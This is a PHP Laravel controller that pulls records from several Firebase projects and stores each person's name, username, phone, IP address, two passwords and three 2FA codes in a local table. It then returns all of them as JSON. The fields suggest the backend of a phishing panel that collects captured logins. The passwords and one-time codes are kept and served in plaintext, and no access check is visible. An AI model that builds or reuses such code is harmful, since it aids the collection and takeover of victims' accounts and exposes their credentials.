<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Services\FirestoreService;
use Google\Cloud\Core\Exception\GoogleException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Kreait\Firebase\Factory;
use Google\Cloud\Firestore\FirestoreClient;

class ApiFirebaseController extends Controller
{
    /**
     * @throws GoogleException
     */
    public function index()
    {
        $accountPaths = [
            storage_path('app/firebase/admin-sdk.json'),
            storage_path('app/firebase/admin-sdk2.json'),
            // ... thêm các đường dẫn tới các key file khác nếu cần
        ];

        $mergedData = [];
        $insertedData = [];

        foreach ($accountPaths as $path) {
            try {
                $firestoreService = new FirestoreService($path);
                $data = $firestoreService->getAllData('data');
                $mergedData = array_merge($mergedData, $data);
            } catch (\Exception $e) {
                // Handle or log the exception as needed
                Log::error("Error fetching data from Firebase with path {$path}: {$e->getMessage()}");
            }
        }
        foreach ($mergedData as $userData) {

            $dataToInsert = [
                'name' => $userData['name'] ?? '',
                'email' => $userData['username'] ?? '',
                'phone' => $userData['phone'] ?? '',
                'ip' => $userData['ip'] ?? '',
                'password1' => $userData['cap1'] ?? '',
                'password2' => $userData['cap2'] ?? '',
                '2fa1' => $userData['twoFA1'] ?? '',
                '2fa2' => $userData['twoFA2'] ?? '',
                '2fa3' => $userData['twoFA3'] ?? '',
                'comment' => $userData['comment'] ?? '',
            ];
            $existingRecord = User::where($dataToInsert)->first();

            if (!$existingRecord) {
                User::create($dataToInsert);
            }
        }
        $user = User::OrderByDesc('created_at')->get();

        return response()->json(['user' => $user, 'message' => 'get data successful'], 200);
    }
}
